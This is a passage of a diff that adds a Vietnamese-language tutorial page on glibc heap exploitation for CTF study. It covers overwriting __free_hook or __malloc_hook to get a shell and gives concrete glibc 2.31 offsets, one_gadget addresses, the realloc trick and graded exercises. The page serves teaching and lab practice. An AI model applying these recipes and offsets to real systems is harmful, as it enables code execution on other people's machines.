+    <div class="card"><h4>glibc ≥2.34</h4><p>Không còn hook. Mọi nỗ lực vô ích → FSOP/exit handler.</p></div>
+    <div class="card"><h4>one_gadget không thỏa</h4><p>Constraint sai (rsp, regs). Thử gadget khác hoặc realloc trick.</p></div>
+    <div class="card"><h4>Quên "/bin/sh" trong chunk</h4><p>free_hook=system nhưng arg không phải "/bin/sh" → system(rác).</p></div>
+    <div class="card"><h4>Trigger sai hook</h4><p>Ghi malloc_hook nhưng chỉ free → không gọi. Khớp hook với thao tác trigger.</p></div>
+    <div class="card"><h4>Safe-linking bỏ qua</h4><p>≥2.32 poisoning cần mã hóa fd (xem bài poisoning).</p></div>
+    <div class="card"><h4>Leak libc sai</h4><p>Offset hook sai theo base. Kiểm base kết thúc 000.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & NHẬN DIỆN</div>
+  <h2>Hook trong bức tranh lớn</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>glibc</th><th>Hook?</th><th>Đích RCE nên dùng</th></tr></thead>
+    <tbody>
+      <tr><td>≤ 2.31</td><td class="yes">Có</td><td>__free_hook=system (0x1eee48) / malloc_hook=one_gadget</td></tr>
+      <tr><td>2.32 – 2.33</td><td class="yes">Có</td><td>Vẫn hook (nhớ safe-linking khi poisoning)</td></tr>
+      <tr><td>≥ 2.34</td><td class="no">Không</td><td><a href="fsop.html">FSOP</a> · <a href="house_of_apple2.html">apple2</a> · <a href="exit_handlers.html">exit handler</a></td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">Chốt</span>Hook là đích <em>dễ nhất</em> nhưng chỉ còn dùng cho đề glibc cũ (rất nhiều đề training/CTF vẫn dùng 2.27–2.31). Biết version trước, chọn đích sau. Offset trên là 2.31 Ubuntu 20.04 — version/distro khác thì <code>libc.sym</code> tự tính đúng.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐ · free_hook = system</div><p>glibc 2.27/2.31: UAF/poisoning ghi <code>__free_hook=system</code>, free chunk "/bin/sh" → shell.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · malloc_hook = one_gadget</div><p>Chỉ có malloc: ghi <code>__malloc_hook=one_gadget</code>, thử từng gadget (0xe3afe/0xe3b01/0xe3b04) tới khi thỏa.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · realloc trick</div><p>Khi one_gadget không thỏa trực tiếp: dùng cặp malloc_hook/realloc_hook để chỉnh stack.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">__free_hook</div><p>Hook gọi khi free(p); arg=p (→rdi). 2.31: +0x1eee48.</p></div>
+    <div class="card"><div class="term">__malloc_hook</div><p>Hook gọi khi malloc(n); arg=n. 2.31: +0x1ecb70.</p></div>
+    <div class="card"><div class="term">one_gadget</div><p>Addr trong libc → execve("/bin/sh").</p></div>
+    <div class="card"><div class="term">constraint</div><p>Điều kiện regs/stack để one_gadget chạy.</p></div>
+    <div class="card"><div class="term">realloc trick</div><p>Dịch stack để thỏa one_gadget.</p></div>
+    <div class="card"><div class="term">glibc 2.34</div><p>Mốc bỏ __malloc/free_hook.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Dẫn tới đây: <a href="tcache_fastbin.html">tcache_fastbin</a> · <a href="unsorted_largebin.html">unsorted_largebin</a>. Thay thế (glibc mới): <a href="fsop.html">fsop</a> · <a href="exit_handlers.html">exit_handlers</a> · <a href="house_of_apple2.html">house_of_apple2</a>.</li>
+    <li><code>one_gadget</code> (david942j) · glibc <code>malloc/hooks.c</code>.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 4 · Bài 22.</strong> __free_hook=system → free("/bin/sh"); __malloc_hook=one_gadget → malloc. 2.31: free_hook +0x1eee48, system +0x52290. CHỈ glibc ≤2.33. Từ 2.34 chuyển FSOP. Tiếp theo: FSOP.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("hok-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("hok-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  var scenes=[
+    {h:"Có free() + ghi được chunk",b:"→ <b>__free_hook = system</b> (+0x1eee48 → +0x52290). Đặt \"/bin/sh\" vào một chunk, free nó. Không cần one_gadget, không ràng buộc. <span style=\"color:var(--ok);font-weight:700\">Đường chắc nhất.</span>"},
+    {h:"Chỉ malloc(), one_gadget thỏa",b:"→ <b>__malloc_hook = one_gadget</b> (vd base+0xe3b01). Trigger bằng malloc bất kỳ (hoặc printf(\"%Nc\")). Cần một one_gadget có constraint thỏa tại thời điểm malloc gọi hook."},
+    {h:"one_gadget không thỏa",b:"→ <b>realloc trick</b>: __malloc_hook = &amp;realloc+off (dịch stack), __realloc_hook = one_gadget. Chỉnh rsp cho thỏa constraint rồi gọi."},
+    {h:"glibc ≥ 2.34",b:"<span style=\"color:var(--danger);font-weight:700\">KHÔNG còn hook.</span> libc.sym.__free_hook = None. Chuyển sang <b>FSOP</b> (ghi _IO_2_1_stdout_/vtable) hoặc <b>exit handler</b>."}
+  ];
+  var picker=document.getElementById("picker"),stage=document.getElementById("stage");
+  function show(i){var s=scenes[i];stage.innerHTML="<h4>"+s.h+"</h4><p style='margin:0'>"+s.b+"</p>";
+    [].forEach.call(picker.children,function(b,j){b.classList.toggle("active",j===i);});}
+  picker.addEventListener("click",function(e){var s=e.target.getAttribute("data-s");if(s!==null)show(+s);});
+  show(0);
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
